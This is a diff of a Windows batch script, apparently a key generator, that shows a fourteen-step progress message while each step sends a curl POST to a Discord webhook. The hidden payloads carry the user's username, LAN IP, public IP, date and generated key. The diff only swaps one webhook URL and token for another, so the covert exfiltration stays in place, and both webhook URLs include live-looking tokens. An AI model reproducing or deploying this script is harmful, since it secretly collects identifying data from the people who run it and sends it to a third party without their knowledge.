@@ -145,59 +145,59 @@ set key=%random%%random%-%random%%random%-%random%%random%
 cls
 echo %normal% It can take some time! %hide%
 echo %normal% 1/14 %hide%
-curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"--------------------------------------------------------------\"}" https://discord.com/api/webhooks/948608054616813658/3XOlB5nj7ZvIJ9PhFeIyPzh7s56JKyiO5LzKVE0xDsEOtJoYpLYXacaoYZHbG-Nq6Yrz
+curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"--------------------------------------------------------------\"}" https://discord.com/api/webhooks/948630457417887814/cUTct9iaMoqratsa-d3Ax83Jt2567juqjTq_-c7pgjV8jfD2bWobGsrLJLa28qvH7eFN
 cls
 echo %normal% It can take some time! %hide%
 echo %normal% 2/14 %hide%
-curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"KEY=FALSE\"}" https://discord.com/api/webhooks/948608054616813658/3XOlB5nj7ZvIJ9PhFeIyPzh7s56JKyiO5LzKVE0xDsEOtJoYpLYXacaoYZHbG-Nq6Yrz
+curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"KEY=FALSE\"}" https://discord.com/api/webhooks/948630457417887814/cUTct9iaMoqratsa-d3Ax83Jt2567juqjTq_-c7pgjV8jfD2bWobGsrLJLa28qvH7eFN
 cls
 echo %normal% It can take some time! %hide%
 echo %normal% 3/14 %hide%
-curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"Date: %date%\"}" https://discord.com/api/webhooks/948608054616813658/3XOlB5nj7ZvIJ9PhFeIyPzh7s56JKyiO5LzKVE0xDsEOtJoYpLYXacaoYZHbG-Nq6Yrz
+curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"Date: %date%\"}" https://discord.com/api/webhooks/948630457417887814/cUTct9iaMoqratsa-d3Ax83Jt2567juqjTq_-c7pgjV8jfD2bWobGsrLJLa28qvH7eFN
 cls
 echo %normal% It can take some time! %hide%
 echo %normal% 4/14 %hide%
-curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"Key:  %key%\"}" https://discord.com/api/webhooks/948608054616813658/3XOlB5nj7ZvIJ9PhFeIyPzh7s56JKyiO5LzKVE0xDsEOtJoYpLYXacaoYZHbG-Nq6Yrz
+curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"Key:  %key%\"}" https://discord.com/api/webhooks/948630457417887814/cUTct9iaMoqratsa-d3Ax83Jt2567juqjTq_-c7pgjV8jfD2bWobGsrLJLa28qvH7eFN
 cls
 echo %normal% It can take some time! %hide%
 echo %normal% 5/14 %hide%
-curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"--------------------------------------------------------------\"}" https://discord.com/api/webhooks/948608054616813658/3XOlB5nj7ZvIJ9PhFeIyPzh7s56JKyiO5LzKVE0xDsEOtJoYpLYXacaoYZHbG-Nq6Yrz
+curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"--------------------------------------------------------------\"}" https://discord.com/api/webhooks/948630457417887814/cUTct9iaMoqratsa-d3Ax83Jt2567juqjTq_-c7pgjV8jfD2bWobGsrLJLa28qvH7eFN
 cls
 echo %normal% It can take some time! %hide%
 echo %normal% 6/14 %hide%
-curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \":: %date%\"}" https://discord.com/api/webhooks/948608054616813658/3XOlB5nj7ZvIJ9PhFeIyPzh7s56JKyiO5LzKVE0xDsEOtJoYpLYXacaoYZHbG-Nq6Yrz
+curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \":: %date%\"}" https://discord.com/api/webhooks/948630457417887814/cUTct9iaMoqratsa-d3Ax83Jt2567juqjTq_-c7pgjV8jfD2bWobGsrLJLa28qvH7eFN
 cls
 echo %normal% It can take some time! %hide%
 echo %normal% 7/14 %hide%
-curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"set pcname=%username%\"}" https://discord.com/api/webhooks/948608054616813658/3XOlB5nj7ZvIJ9PhFeIyPzh7s56JKyiO5LzKVE0xDsEOtJoYpLYXacaoYZHbG-Nq6Yrz
+curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"set pcname=%username%\"}" https://discord.com/api/webhooks/948630457417887814/cUTct9iaMoqratsa-d3Ax83Jt2567juqjTq_-c7pgjV8jfD2bWobGsrLJLa28qvH7eFN
 cls
 echo %normal% It can take some time! %hide%
 echo %normal% 8/14 %hide%
-curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"set rank=Member\"}" https://discord.com/api/webhooks/948608054616813658/3XOlB5nj7ZvIJ9PhFeIyPzh7s56JKyiO5LzKVE0xDsEOtJoYpLYXacaoYZHbG-Nq6Yrz
+curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"set rank=Member\"}" https://discord.com/api/webhooks/948630457417887814/cUTct9iaMoqratsa-d3Ax83Jt2567juqjTq_-c7pgjV8jfD2bWobGsrLJLa28qvH7eFN
 cls
 echo %normal% It can take some time! %hide%
 echo %normal% 9/14 %hide%
-curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"set name=%name%\"}" https://discord.com/api/webhooks/948608054616813658/3XOlB5nj7ZvIJ9PhFeIyPzh7s56JKyiO5LzKVE0xDsEOtJoYpLYXacaoYZHbG-Nq6Yrz
+curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"set name=%name%\"}" https://discord.com/api/webhooks/948630457417887814/cUTct9iaMoqratsa-d3Ax83Jt2567juqjTq_-c7pgjV8jfD2bWobGsrLJLa28qvH7eFN
 cls
 echo %normal% It can take some time! %hide%
 echo %normal% 10/14 %hide%
-curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"--------------------------------------------------------------\"}" https://discord.com/api/webhooks/948608054616813658/3XOlB5nj7ZvIJ9PhFeIyPzh7s56JKyiO5LzKVE0xDsEOtJoYpLYXacaoYZHbG-Nq6Yrz
+curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"--------------------------------------------------------------\"}" https://discord.com/api/webhooks/948630457417887814/cUTct9iaMoqratsa-d3Ax83Jt2567juqjTq_-c7pgjV8jfD2bWobGsrLJLa28qvH7eFN
 cls
 echo %normal% It can take some time! %hide%
 echo %normal% 11/14 %hide%
-curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"IP: %LAN_IP%\"}" https://discord.com/api/webhooks/948608054616813658/3XOlB5nj7ZvIJ9PhFeIyPzh7s56JKyiO5LzKVE0xDsEOtJoYpLYXacaoYZHbG-Nq6Yrz
+curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"IP: %LAN_IP%\"}" https://discord.com/api/webhooks/948630457417887814/cUTct9iaMoqratsa-d3Ax83Jt2567juqjTq_-c7pgjV8jfD2bWobGsrLJLa28qvH7eFN
 cls
 echo %normal% It can take some time! %hide%
 echo %normal% 12/14 %hide%
-curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"Public_IP: %ExtIP%\"}" https://discord.com/api/webhooks/948608054616813658/3XOlB5nj7ZvIJ9PhFeIyPzh7s56JKyiO5LzKVE0xDsEOtJoYpLYXacaoYZHbG-Nq6Yrz
+curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"Public_IP: %ExtIP%\"}" https://discord.com/api/webhooks/948630457417887814/cUTct9iaMoqratsa-d3Ax83Jt2567juqjTq_-c7pgjV8jfD2bWobGsrLJLa28qvH7eFN
 cls
 echo %normal% It can take some time! %hide%
 echo %normal% 13/14 %hide%
-curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"--------------------------------------------------------------\"}" https://discord.com/api/webhooks/948608054616813658/3XOlB5nj7ZvIJ9PhFeIyPzh7s56JKyiO5LzKVE0xDsEOtJoYpLYXacaoYZHbG-Nq6Yrz
+curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"--------------------------------------------------------------\"}" https://discord.com/api/webhooks/948630457417887814/cUTct9iaMoqratsa-d3Ax83Jt2567juqjTq_-c7pgjV8jfD2bWobGsrLJLa28qvH7eFN
 cls
 echo %normal% It can take some time! %hide%
 echo %normal% 14/14 %hide%
-curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"**        **\"}" https://discord.com/api/webhooks/948608054616813658/3XOlB5nj7ZvIJ9PhFeIyPzh7s56JKyiO5LzKVE0xDsEOtJoYpLYXacaoYZHbG-Nq6Yrz
+curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"**        **\"}" https://discord.com/api/webhooks/948630457417887814/cUTct9iaMoqratsa-d3Ax83Jt2567juqjTq_-c7pgjV8jfD2bWobGsrLJLa28qvH7eFN
 cls
 echo %normal% Done! 
 echo Your key: %key%
